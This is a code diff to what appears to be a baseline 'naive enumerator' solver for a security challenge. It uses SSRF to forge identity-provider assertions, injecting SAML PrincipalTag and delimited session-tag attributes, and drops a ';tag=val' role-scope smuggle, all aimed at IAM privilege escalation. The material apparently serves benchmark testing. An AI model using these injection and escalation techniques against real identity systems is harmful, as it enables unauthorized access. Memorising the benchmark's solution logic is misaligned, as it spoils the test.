@@ -179,33 +179,25 @@ def _naive_enumerator(base, budget=400):
                         return True
         return False
 
-    # hop 4+5 SEARCH: spray common (namespace, tag, value) placements — WITHOUT reading the per-run
-    # trust-condition value from the served policy. A session only carries a tag if BOTH namespace and
-    # tag match; even then the guessed VALUE fails the trust condition, so escalation never succeeds.
-    for ns in _GEN_NS:
-        for tag in _GEN_TAGS:
-            for val in _GEN_VALUES:
-                if tried >= budget:
-                    return False
-                tried += 1
-                a = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': role, 'attributes': {ns: {tag: val}}})}")
+    # hop 4+5 SEARCH: spray the real attribute-injection vectors (PrincipalTag / delimited claim) with
+    # COMMON GUESSED values — WITHOUT reading the per-run project code the directory publishes. A session
+    # only carries a tag when the right key is used, and even then a guessed VALUE fails the trust
+    # condition, so escalation never succeeds. (A solver that READS the directory code and connects it
+    # to the IAM condition — the intended, realistic reasoning — does succeed; that is not this baseline.)
+    _PT = "https://aws.amazon.com/SAML/Attributes/PrincipalTag:"
+    _DC = "https://idp.corp.internal/claims/session-tags"
+    for tag in _GEN_TAGS:
+        for val in _GEN_VALUES:
+            if tried >= budget:
+                return False
+            tried += 1
+            for attrs in ({_PT + tag: val}, {_DC: f"{tag}={val}"}):
+                a = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': role, 'attributes': attrs})}")
                 if not isinstance(a, dict) or "assertion" not in a:
                     continue
                 sess = ssrf(f"{IAM}/iam/session?assertion={a['assertion']}")
-                if not isinstance(sess, dict) or "session" not in sess:
-                    continue
-                # only bother escalating if the spray actually produced a tag (rare: exact ns+tag)
-                if sess.get("tags") and _escalate(sess["session"]):
+                if isinstance(sess, dict) and sess.get("tags") and _escalate(sess["session"]):
                     return True
-    # scoped-role family: spray the ';tag=val' role-scope smuggle too (same guessed values -> fails)
-    for tag in _GEN_TAGS:
-        for val in _GEN_VALUES:
-            a = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': f'{role};{tag}={val}', 'attributes': {}})}")
-            if not isinstance(a, dict) or "assertion" not in a:
-                continue
-            sess = ssrf(f"{IAM}/iam/session?assertion={a['assertion']}")
-            if isinstance(sess, dict) and sess.get("tags") and _escalate(sess["session"]):
-                return True
     # also try assuming/granting directly on an untagged session (pure role/action brute force)
     a = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': role, 'attributes': {}})}")
     if isinstance(a, dict) and "assertion" in a:
